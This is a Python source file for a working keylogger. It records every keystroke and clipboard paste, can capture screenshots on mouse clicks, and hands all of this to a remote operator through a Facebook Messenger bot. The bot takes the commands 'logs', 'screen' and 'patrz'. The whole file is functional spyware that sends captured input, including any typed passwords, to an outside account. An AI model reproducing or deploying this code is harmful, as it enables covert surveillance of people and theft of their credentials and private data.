import os

import glob
import keyboard
from keyboard import mouse
import pyscreenshot
from PIL import ImageDraw
import pymouse
import fbchat


class FacebookController(fbchat.Client):
    def __init__(self, login, password, owner_uid, keylogger):
        super(FacebookController, self).__init__(login, password)

        self.owner_uid = owner_uid
        self.keylogger = keylogger

    def send_to_owner(self, message):
        self.send(self.owner_uid, message)

    def on_message(self, mid, author_id, author_name, message, metadata):
        if 'patrz' in message:
            self.keylogger.toggle_screenshots_capturing()
        if message == 'screen':
            for screenshot in self.keylogger.get_saved_screenshots():
                self.sendLocalImage(self.owner_uid, message='to widzialem', image=screenshot)
            self.keylogger.reset_screenshot_directory()
        if message == 'logs':
            self.send_to_owner(''.join(self.keylogger.flush_captured_keys()))


class Keylogger(object):
    def __init__(self):
        self.captured_keys = []
        self.captured_pasting = []
        self.capture_screenshots_on_click = False

        self.reset_screenshot_directory()

        keyboard.on_press(self._on_key_press)
        keyboard.add_hotkey('ctrl+v', self._on_paste)
        keyboard.mouse.hook(self._on_left_mouse_button_click)

    def toggle_screenshots_capturing(self):
        self.capture_screenshots_on_click = not self.capture_screenshots_on_click

    def flush_captured_keys(self):
        captured_keys, self.captured_keys = self.captured_keys, []
        return captured_keys

    def get_saved_screenshots(self):
        return glob.glob('/tmp/screen*.jpg')

    def reset_screenshot_directory(self):
        self.screenshot_counter = 0
        os.system('rm /tmp/screen*.jpg')

    def _on_left_mouse_button_click(self, *args, **kwargs):
        if self.capture_screenshots_on_click:
            screenshot = self._mark_mouse_position(pyscreenshot.grab())
            screenshot.save('/tmp/screen{}.jpg'.format(self.screenshot_counter))
            self.screenshot_counter += 1

    def _mark_mouse_position(self, screenshot):
        mouse_x, mouse_y = pymouse.PyMouse().position()
        ImageDraw.Draw(screenshot).ellipse([mouse_x - 10, mouse_y - 10, mouse_x + 10, mouse_y + 10], fill=(0, 0, 255))

        return screenshot

    def _on_key_press(self, event):
        if event.name == 'alt gr':
            event.name = 'alt'
        if len(event.name) > 1:
            event.name = '[{}]'.format(event.name)
        self.captured_keys.append(event.name)

    def _on_paste(self):
        import pyperclip # Doesn't work when imported globally
        self.captured_pasting.append(pyperclip.paste())


k = Keylogger()
controller = FacebookController(os.environ['FACEBOOK_LOGIN_TO_SEND_KEYLOGGER_LOGS_FROM'],
                                os.environ['FACEBOOK_PASSWORD_TO_SEND_KEYLOGGER_LOGS_FROM'],
                                os.environ['FACEBOOK_KEYLOGGER_OWNER_UID'],
                                k)
controller.send_to_owner('Wtam, jestem Pomocnikiem Magika. Do uslug')
controller.listen()
